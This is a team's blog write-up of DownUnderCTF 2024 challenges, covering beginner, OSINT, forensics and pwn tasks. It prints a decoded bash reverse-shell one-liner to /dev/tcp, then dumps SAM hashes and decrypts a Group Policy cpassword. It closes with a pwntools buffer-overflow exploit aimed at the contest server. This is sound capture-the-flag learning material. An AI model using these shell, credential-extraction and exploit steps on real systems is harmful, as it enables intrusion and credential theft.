---
title: "DownUnderCTF"
description: "Migrated from Astro"
icon: "article"
date: "2024-07-07"
lastmod: "2024-07-07"
draft: false
toc: true
weight: 999
---

Well, now and then, we come across a big CTF like this. Starting out late, let’s see how it goes.

```bash
Authors: AbuCTF, MrRobot, SHL, MrGhost, PattuSai, Rohmat
```
Okay, but I have to post this LOL.

{{< figure src="0-5.png" alt="p4" >}}

## **Beginner**

### **TLDR please summarize**

**Description**: 

I thought I was being 1337 by asking AI to help me solve challenges, now I have to reinstall Windows again. Can you help me out by find the flag in this document?

**Author**: Nosurf

Given: `EmuWar.Docx`

Straight away, I copy the `docx` file into a `zip` and extract. Going straight to `/word/document.xml` ,

cause that contains the actually content of the `docx` file. Opening in VS Code.

{{< figure src="1.png" alt="1" >}}

Onto to the pastebin site, we see a `base64` string decoding it, we get the flag.

```bash
┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/DUCTF/begin]
└─$ echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8yNjEuMjYzLjI2My4yNjcvRFVDVEZ7Y2hhdGdwdF9JX24zM2RfMl8zc2NhcDN9IDA+JjE=" | base64 -d
bash -i >& /dev/tcp/261.263.263.267/DUCTF{chatgpt_I_n33d_2_3scap3} 0>&1
```

**Flag**: `DUCTF{chatgpt_I_n33d_2_3scap3}`

### **Shufflebox**

**Description**: 

I've learned that if you shuffle your text, it's elrlay hrda to tlle htaw eht nioiglra nutpi aws.

Find the text censored with question marks in `output_censored.txt` and surround it with `DUCTF{}`.

**Author**: hashkitten

**Given**: `shufflebox.py` `output_censored.txt`

The given code in `shufflebox.py` uses a permutation list (`PERM`) to shuffle the characters of a 16-character string. The goal is to reverse this permutation process to find the original string that, when shuffled using the same permutation, results in the given output.

Let's go through the `shufflebox.py` script step by step to understand its functionality.

`shufflebox.py` Breakdown

```python
import random

PERM = list(range(16))
random.shuffle(PERM)
```

1. **Import the random module**: This module will be used to generate a random permutation.
2. **Create a list `PERM` with numbers from 0 to 15**: This represents the indices of a 16-character string.
3. **Shuffle the `PERM` list**: The `random.shuffle(PERM)` function randomly shuffles the elements in the list. This shuffled list will be used as the permutation to reorder characters in the input string.

```python
def apply_perm(s):
    assert len(s) == 16
    return ''.join(s[PERM[p]] for p in range(16))
```

1. **Define the `apply_perm` function**: This function takes a 16-character string `s` as input.
2. **Assert the length of the string**: The function checks if the input string has exactly 16 characters. If not, it raises an assertion error.
3. **Reorder characters using the permutation**: The function returns a new string where each character in the input string `s` is placed at the position specified by the shuffled list `PERM`.

For example, if `PERM` is `[3, 0, 1, 2, 7, 4, 5, 6, 11, 8, 9, 10, 15, 12, 13, 14]` and the input string is "abcdefghijklmnop":

- The character at index `0` in the input string moves to index `3` in the output string.
- The character at index `1` in the input string moves to index `0` in the output string.
- This continues for all 16 characters.

```python
for line in open(0):
    line = line.strip()
    print(line, '->', apply_perm(line))
```

1. **Read input lines**: The script reads lines from the standard input (file descriptor 0). Each line is expected to be a 16-character string.
2. **Strip any extra whitespace**: The script removes leading and trailing whitespace from each line.
3. **Apply the permutation and print the result**: The script applies the `apply_perm` function to the line and prints the original line followed by the permuted line.

Example Execution

Let's walk through an example:

Assume `PERM` after shuffling is `[2, 3, 0, 1, 6, 7, 4, 5, 10, 11, 8, 9, 14, 15, 12, 13]`.

If the input line is "abcdefghijklmnop":

1. The input string "abcdefghijklmnop" will be transformed using the permutation `[2, 3, 0, 1, 6, 7, 4, 5, 10, 11, 8, 9, 14, 15, 12, 13]`.
2. The resulting permuted string will be "cdabghiefjklmnop".

You’d have to be absolutely mental, if you tried to brute-force this.

{{< figure src="2.png" alt="p4" >}}

<aside>
💡 Neither '`rand()`' nor '`random()`' are perfectly random. That's impossible for something that uses only software. To get true randomness you need some kind of external hardware that uses some kind of quantum effect. But for almost every case, nobody cares! But if you're doing cryptography in a secure environment, you ABSOLUTELY MUST NOT use either rand() or random() because if you do, then hackers can easily figure out the sequence and decrypt your secure communications. But for things like games, the very good performance of rand() can be important, so it gets used a LOT.

</aside>

`random.shuffle(x)`

To shuffle an immutable sequence and return a new shuffled list, use `sample(x, k=len(x))` instead.
Note that even for small `len(x)`, the total number of permutations of *x* can quickly grow larger than the period of most random number generators. This implies that most permutations of a long sequence can never be generated. For example, a sequence of length 2080 is the largest that can fit within the period of the Mersenne Twister random number generator.

At this point, I’ve tried my best. Tried looking at similar past write-ups, even looking at `random.shuffle` module source code. Well, let’s now wait for the write-ups. 

My big-brain teammate `@PattuSai` solved this in no time. I’m gonna cry.

```bash
aaaabbbbccccdddd -> ccaccdabdbdbbada
abcdabcdabcdabcd -> bcaadbdcdbcdacab
???????????????? -> owuwspdgrtejiiud
```

Just compare the 2 output sequences, and search for the same pair sequence in input. For example, in the first pair of input is [a , a]. Now, we search for the the same sequence in the output sequence, we find [a, a] is in the 2nd index. Find out the character 2nd index of the cipher and place it in the 0th index. Pattern follows.

**Flag**: `DUCTF{udiditgjwowsuper}`

BTW, I came across this portfolio. Absolutely blew me away !

[Alulae - Blog of a gremlin](https://juliapoo.github.io/)

## Miscellaneous

### Discord

**Description:** 

The evil bug has torn one of our flags into pieces and hidden it in our Discord server - https://duc.tf/discord. Can you find all the pieces for us? Form an alliance at `#team-search` to coordinate and expedite your search efforts. Make sure to opt in at `#opt-in-updates` channel to stay updated on new hints and challenges being released. Join us on the journey to defeat the evil bug!

**Author**: DUCTF

First part of the flag can be found it the #team-search channel.

{{< figure src="3.png" alt="3" >}}

And the second is in #opt-in-updates

{{< figure src="4.png" alt="4" >}}

**Flag: `DUCTF{f1r57_0f_m4ny}`**

## Forensics

### **Baby's First Forensics**

**Description:** 

They've been trying to breach our infrastructure all morning! They're trying to get more info on our covert kangaroos! We need your help, we've captured some traffic of them attacking us, can you tell us what tool they were using and its version?

**NOTE**: Wrap your answer in the `DUCTF{}`, e.g. `DUCTF{nmap_7.25}`

**Author**: Pix

**Given**: `capture.pcap`

Since, we were to find just the tool the attacker is using, I just used `strings` on it to find the tool.

```bash
┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/DUCTF/forensics]
└─$ strings capture.pcap | more
in-addr
arpa
in-addr
arpa
root-servers
nstld
verisign-grs
HEAD / HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)
Host: 172.16.17.135
```

**Flag**: `DUCTF{Nikto_2.1.6}`


### **SAM I AM**

**Description:** 

The attacker managed to gain Domain Admin on our rebels Domain Controller! Looks like they managed to log on with an account using WMI and dumped some files.

Can you reproduce how they got the Administrator's Password with the artifacts provided?

Place the Administrator Account's Password in `DUCTF{}`, e.g. `DUCTF{password123!}`

**Author**: TurboPenguin

Given: `samiam.zip`

Unzipping the file, we get a `system.bak` and `sam.bak`

```bash
┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/DUCTF/forensics]
└─$ unzip samiam.zip
Archive:  samiam.zip
  inflating: samiam/sam.bak
  inflating: samiam/system.bak
```

Since, I had experience with SAM registry files. This time  the SYSTEM file was also provided. Went straight to `samdump2`

```bash
┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/DUCTF/forensics/samiam]
└─$ samdump2 system.bak sam.bak
Administrator:500:aad3b435b51404eeaad3b435b51404ee:476b4dddbbffde29e739b618580adb1e:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Using `crackstation`, we crack the NTLM hash.

{{< figure src="5.png" alt="5" >}}

**Flag**: `DUCTF{!checkerboard1}`

### **Bad Policies**

**Description**: 

Looks like the attacker managed to access the rebels Domain Controller.

Can you figure out how they got access after pulling these artifacts from one of our Outpost machines?

**Author**: TurboPenguin

**Given**: `badpolicies.zip`

Get familiar with the directories and files. Especially, Group Policy Preferences (GPP) configurations.

One such example is the one at `\badpolicies\rebels.ductf\Policies\{B6EF39A3-E84F-4C1D-A032-00F042BE99B5}\Machine\Preferences\Groups\Groups.xml`

```bash
┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/DUCTF/forensics/badpolicies/rebels.ductf/Policies/{B6EF39A3-E84F-4C1D-A032-00F042BE99B5}/Machine/Preferences/Groups]
└─$ cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
name="Backup" image="2" changed="2024-06-12 14:26:50" 
uid="{CE475804-94EA-4C12-8B2E-2B3FFF1A05C4}">
<Properties action="U" newName="" fullName="" description="" 
cpassword="B+iL/dnbBHSlVf66R8HOuAiGHAtFOVLZwXu0FYf+jQ6553UUgGNwSZucgdz98klzBuFqKtTpO1bRZIsrF8b4Hu5n6KccA7SBWlbLBWnLXAkPquHFwdC70HXBcRlz38q2" 
changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="Backup"/></User>
</Groups>
```

This gives us a GPP Password. Note: The presence of the `cpassword` attribute indicates an encrypted password. However, it is known that the encryption method used by GPP is weak and reversible, meaning an attacker could potentially decrypt the password if they gained access to this XML file. 

Use a tool called `gpp-decrypt` to decrypt the password.

```bash
┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/DUCTF/forensics/badpolicies/rebels.ductf/Policies/{B6EF39A3-E84F-4C1D-A032-00F042BE99B5}/Machine/Preferences/Groups]
└─$ gpp-decrypt B+iL/dnbBHSlVf66R8HOuAiGHAtFOVLZwXu0FYf+jQ6553UUgGNwSZucgdz98klzBuFqKtTpO1bRZIsrF8b4Hu5n6KccA7SBWlbLBWnLXAkPquHFwdC70HXBcRlz38q2
DUCTF{D0n7_Us3_P4s5w0rds_1n_Gr0up_P0l1cy}
```

**Flag**:  `DUCTF{D0n7_Us3_P4s5w0rds_1n_Gr0up_P0l1cy}`

## OSINT

### offtheramp

**Description**: 

That looks like a pretty cool place to escape by boat, EXAMINE the image and discover the name of this structure.

NOTE: Flag is case-insensitive and requires placing inside `DUCTF{}`! e.g `DUCTF{name_of_structure}`

**Author**: Anon

Given: `offtheramp.jpg`

{{< figure src="6.jpeg" alt="p4" >}}

Been using an AI called `picarta` , to help narrow down photos for OSINT.

{{< figure src="7.png" alt="p4" >}}

Now, this gave me a straight hit. Damn.

{{< figure src="8.png" alt="8" >}}

**Flag**: `DUCTF{olivers_hill_boat_ramp}`

### **cityviews**

**Description**: 

After having to go on the run, I've had to bunker down. Which building did I capture this picture from?

NOTE: Flag is case-insensitive and requires placing inside `DUCTF{}`! e.g `DUCTF{building_name}`

**Author**: Anon

**Given**: `cityviews.jpg`

Turns out, we still in Melbourne.

{{< figure src="9.png" alt="9" >}}

First, I found the source, by playing around with google lens.

{{< figure src="10.png" alt="p4" >}}

Found this image, and then narrowed down.

**Flag: `DUCTF{hotel_indigo}`**

### **Bridget Lives**

**Description**: 

After dropping numerous 0days last year Bridget has flown the coop. This is the last picture she posted before going dark. Where was this photo taken from?

**NOTE**: Flag is case-insensitive and requires placing inside `DUCTF{}`! e.g. `DUCTF{name_of_building}`

**Author**: a_metre

Given: `bridget.png`

{{< figure src="11.png" alt="p4" >}}

After a simple google, we land on Singapore. We find the bridge pretty easily.

{{< figure src="12.png" alt="12" >}}

**Flag**: `DUCTF{four_points}`

### **marketing**

**Description**: We have the best marketing team!

Except for that one monke that looks like they slapped something together...

Maybe the bot should lock away that monke to stopping posting stuff online. The other animals should be free, just not the monke.

**Author**: ghostccamm

Typical OSINT type stuff, go straight to the Discord server for clues. Found em!

{{< figure src="13.png" alt="13" >}}

With that, we find the username `ghostccamm`. Turns out he uses Twitter with the same username.

{{< figure src="14.png" alt="14" >}}

Look closely.

**Flag**: `DUCTF{doing_a_bit_of_marketing}`

Wait, I found this flag is actually for the **marketing challenge LOL. I’ll just edit the title then.**

### **back to the jungle**

**Description:** 

Did MC Fat Monke just drop a new track????? 👀👀👀

**Author**: ghostccamm

Just google MC Fat Monke.

{{< figure src="15.png" alt="15" >}}

Watch the video with eyes open. @2:34, we see a link.

```bash
average-primate-th.wixsite.com/mc-fat-monke-appreci
```

{{< figure src="16.png" alt="p4" >}}

Flag: `DUCTF{wIr_G0iNg_b4K_t00_d3r_jUNgL3_mIt_d15_1!!111!}`

{{< figure src="16-5.png" alt="p4" >}}

## Pwn

### **vector overflow**

**Description**: 

Please overflow into the vector and control it!

**Author**: joseph

```
nc 2024.ductf.dev 30013
```

**Given**: `vector_overflow` `vector_overflow.cpp`

 As `pwn’s` ultimate noob, I’m ~~hyped~~ nervous af right now.

{{< figure src="17.png" alt="p4" >}}

```bash
┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/DUCTF/pwn]
└─$ file vector_overflow
vector_overflow: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), 
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
BuildID[sha1]=4a0b824c662ee47b5cd3e73176c0092f1fcf714b, 
for GNU/Linux 3.2.0, not stripped
```

Let’s understand, what all this means. 

1. **ELF 64-bit LSB executable, x86-64**: This indicates that the file is an Executable and Linkable Format (ELF) file, which is a standard file format for executables, object code, shared libraries, and core dumps in Unix-like operating systems. "64-bit" specifies that it is a 64-bit executable, and "LSB" (Least Significant Byte first) indicates the byte order (also known as little-endian). "x86-64" specifies the architecture, meaning it is designed for 64-bit Intel and AMD processors.
2. **version 1 (SYSV)**: This refers to the ELF version and the System V ABI (Application Binary Interface) standard, which is a specification that defines a binary interface for application programs on UNIX systems.
3. **dynamically linked**: This indicates that the executable is dynamically linked, meaning it relies on shared libraries (e.g., libc.so) that are loaded into memory at runtime rather than being statically linked (included in the executable itself).
4. **interpreter /lib64/ld-linux-x86-64.so.2**: This specifies the dynamic linker/loader that will be used to load the shared libraries required by the executable. The specified interpreter is `/lib64/ld-linux-x86-64.so.2`, which is the standard dynamic linker for 64-bit Linux systems.
5. **BuildID[sha1]=4a0b824c662ee47b5cd3e73176c0092f1fcf714b**: This is a unique identifier for the binary, generated using the SHA-1 hashing algorithm. It can be used for debugging purposes or to verify the integrity of the executable.
6. **for GNU/Linux 3.2.0**: This indicates the minimum version of the Linux kernel that is required to run the executable. In this case, the executable requires at least version 3.2.0 of the Linux kernel.
7. **not stripped**: This means that the debugging symbols have not been removed from the executable. Debugging symbols provide additional information that can be useful for debugging the program, such as function names, variable names, and line numbers.

In summary, `vector_overflow` is a 64-bit ELF executable for the x86-64 architecture, dynamically linked with shared libraries, designed to run on Linux kernel version 3.2.0 or higher, and contains debugging symbols.

```bash
┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/DUCTF/pwn]
└─$ checksec --file=vector_overflow
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified     Fortifiable      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   121 Symbols       No    0             1                vector_overflow
```

Source: `Sven Vermeulen` @ 15 July 2011

{{< figure src="18.png" alt="18" >}}

It even comes with pretty colors (the "`No RELRO`" is red whereas "`Full RELRO`" is green). But beyond interpreting those colors (which should be obvious for the non-colorblind), what does that all mean? Well, let me try to explain them in one-paragraph entries (yes, I like such challenges ;-) Note that, if a protection is not found, then it probably means that the application was not built with this protection.

**`RELRO`** stands for **`Relocation Read-Only`**, meaning that the headers in your binary, which need to be writable during startup of the application (to allow the dynamic linker to load and link stuff like shared libraries) are marked as read-only when the linker is done doing its magic (but before the application itself is launched). The difference between **Partial RELRO** and **Full RELRO** is that the `Global Offset Table` (and Procedure Linkage Table) which act as kind-of process-specific lookup tables for symbols (names that need to point to locations elsewhere in the application or even in loaded shared libraries) are marked read-only too in the **Full RELRO**. Downside of this is that lazy binding (only resolving those symbols the first time you hit them, making applications start a bit faster) is not possible anymore.

A **`Canary`** is a certain value put on the stack (memory where function local variables are also stored) and validated before that function is left again. Leaving a function means that the "previous" address (i.e. the location in the application right before the function was called) is retrieved from this stack and jumped to (well, the part right after that address - we do not want an endless loop do we?). If the **canary** value is not correct, then the stack might have been overwritten / corrupted (for instance by writing more stuff in the local variable than allowed - called *buffer overflow*) so the application is immediately stopped.

The abbreviation **`NX`** stands for non-execute or non-executable segment. It means that the application, when loaded in memory, does not allow any of its segments to be both writable and executable. The idea here is that writable memory should never be executed (as it can be manipulated) and vice versa. Having **NX enabled** would be good.

The last abbreviation is **`PIE`**, meaning *Position Independent Executable*. A **No PIE** application tells the loader which virtual address it should use (and keeps its memory layout quite static). Hence, attacks against this application know up-front how the virtual memory for this application is (partially) organized. Combined with in-kernel `ASLR` (*Address Space Layout Randomization*, which Gentoo's hardened-sources of course support) PIE applications have a more diverge memory organization, making attacks that rely on the memory structure more difficult.

- **`RPATH`**:
    - **No RPATH**: The RPATH is a hard-coded path in the executable that tells the dynamic linker where to look for shared libraries. The absence of RPATH indicates that no such path is hard-coded in the binary.
- **`RUNPATH`**:
    - **No RUNPATH**: Similar to RPATH, RUNPATH is another hard-coded path in the executable for shared libraries. The absence of RUNPATH indicates that no such path is hard-coded in the binary.
- **`Symbols`**:
    - **121 Symbols**: This indicates that the executable contains 121 symbols, which could include function names, variable names, etc. These symbols can be useful for debugging and analysis.

Again, what is **`FORTIFY_SOURCE`**? Well, when using **FORTIFY_SOURCE**, the compiler will try to intelligently read the code it is compiling / building. When it sees a C-library function call against a variable whose size it can deduce (like a fixed-size array - it is more intelligent than this btw) it will replace the call with a `FORTIFY`'ed function call, passing on the maximum size for the variable. If this special function call notices that the variable is being overwritten beyond its boundaries, it forces the application to quit immediately. Note that not all function calls that can be fortified are fortified as that depends on the intelligence of the compiler (and if it is realistic to get the maximum size).
Well, enough theory. Running the checksec command again, we see something different. I mean I ran the command on the same machine this morning. Have a look.

```bash
┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/DUCTF/pwn]
└─$ checksec --file=vector_overflow
[*] '/mnt/c/Documents4/CyberSec/DUCTF/pwn/vector_overflow'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Anyways, let’s not use `Ghidra` for now. Into `GDB` we go.

```bash
┌──(abu㉿Abuntu)-[/mnt/c/Documents4/CyberSec/DUCTF/pwn]
└─$ gdb ./vector_overflow
GNU gdb (Debian 13.2-1+b1) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
```

First thing I did, 

`(gdb) info functions`

Which reveals these guys.

{{< figure src="19.png" alt="19" >}}

Wait. I already have the source. Why am I disassembling !

Let’s understand this shall we.

**Explanation of the Code**

1. **Global Variables**:
    
    ```cpp
    char buf[16];
    std::vector<char> v = {'X', 'X', 'X', 'X', 'X'};
    ```
    
    - `buf` is a global character array with a size of 16.
    - `v` is a global vector of characters initialized with five 'X' characters.
2. **Functions**:
    - `lose()`:
        
        ```cpp
        void lose() {
            puts("Bye!");
            exit(1);
        }
        ```
        
        - This function prints "Bye!" and then exits the program with a status code of 1.
    - `win()`:
        
        ```cpp
        void win() {
            system("/bin/sh");
            exit(0);
        }
        ```
        
        - This function executes a shell (`/bin/sh`) using the `system` function and then exits the program with a status code of 0.
3. **Main Function**:
    
    ```cpp
    int main() {
        char ductf[6] = "DUCTF";
        char* d = ductf;
    
        std::cin >> buf;
        if(v.size() == 5) {
            for(auto &c : v) {
                if(c != *d++) {
                    lose();
                }
            }
    
            win();
        }
    
        lose();
    }
    ```
    
    - `ductf` is a local character array initialized with the string "DUCTF".
    - `d` is a pointer to the beginning of `ductf`.
    - `std::cin >> buf;`:
        - This line reads input from the user and stores it in `buf`. Note that `buf` can hold up to 15 characters plus a null terminator.
    - `if(v.size() == 5)`:
        - This checks if the size of the vector `v` is 5, which it always is because it's initialized with five 'X' characters.
    - `for(auto &c : v)`:
        - This loop iterates over each character `c` in the vector `v`.
        - `if(c != *d++)`:
            - This checks if the current character `c` in the vector is not equal to the current character pointed to by `d`, and then increments the pointer `d`.
            - If any character in the vector `v` is not equal to the corresponding character in `ductf`, the `lose()` function is called, terminating the program.
    - If all characters in the vector `v` match the characters in `ductf`, the `win()` function is called, which opens a shell and then exits the program.
    - If the size of the vector `v` is not 5, the program calls the `lose()` function and terminates.

{{< figure src="20.png" alt="20" >}}

Just as a remainder. Probably to myself, 

**Position Independent Executable (PIE)**:

- PIE is a security feature that allows executables to be loaded at random memory addresses each time they are executed. This is a part of `Address Space Layout Randomization (ASLR)`.
- When a binary is compiled as a PIE, it can be loaded at any address in memory, which makes it more difficult for an attacker to predict the locations of specific functions or variables.

You get the point right, basically goal of the buffer overflow exploit would be to overwrite the contents of the vector `v` with "DUCTF" to bypass the checks and execute the `win()` function.
But simply doing things like `AAAAAAAAAAAAAAADUCTF` won’t work. To successfully exploit the buffer overflow and call the `win` function in the provided program, you need to find the memory addresses of the functions and calculate the correct offsets. Now, let’s continue with `GDB`.

{{< figure src="20-5.png" alt="20-5" >}}

Since, we already know the size of the buffer, we move on to finding the memory address of the buffer , which is `0x4051e0` . Well the, now comes the most important part, scripting the exploit and sending it to the server. 

This is done through `Pwntools`. It’s so useful so many things. Check it out at.

[Pwntools](https://github.com/Gallopsled/pwntools)

```bash
from pwn import *

# p = process('./vector_overflow')
p = remote('2024.ductf.dev', 30013)
p.sendline(b'DUCTF' + b'A' * 11 + p64(0x4051e0) + p64(0x4051e5))
p.interactive()
```

Flag: `DUCTF{y0u_pwn3d_th4t_vect0r!!}`

This is how I felt after the challenge.

{{< figure src="22.png" alt="p4" >}}

## References

[Checksec](https://medium.com/@slimm609/checksec-d4131dff0fca)

[High level explanation on some binary executable security](https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/)

[DownUnderCTF 2024 Write-Up · Ouuan's blog](https://ouuan.moe/post/2024/07/ductf-2024#yawa-184-solves)

[Identify security properties on Linux using checksec](https://opensource.com/article/21/6/linux-checksec)

[GDB Command Reference - Index page](https://visualgdb.com/gdbreference/commands/)

{{< figure src="continue.jpg" alt="Continue" >}}
